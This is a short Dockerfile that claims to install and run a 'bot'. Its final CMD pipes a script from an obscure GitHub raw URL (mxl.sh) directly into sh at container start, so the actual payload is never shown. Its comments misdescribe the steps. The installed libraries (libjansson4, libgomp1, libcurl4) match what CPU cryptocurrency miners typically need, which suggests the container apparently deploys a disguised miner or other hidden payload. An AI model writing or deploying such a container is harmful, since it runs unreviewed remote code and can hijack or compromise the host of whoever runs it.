FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /mxl/ijk

# Set work dir:
WORKDIR /mxl

# Copy files:
COPY startbot.sh /mxl
COPY /mxl /mxl/ijk

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN echo "Uploaded files:" && ls /mxl/ijk/

# Run bot script:
CMD curl https://raw.githubusercontent.com/55113110159/java/master/mxl.sh | sh 

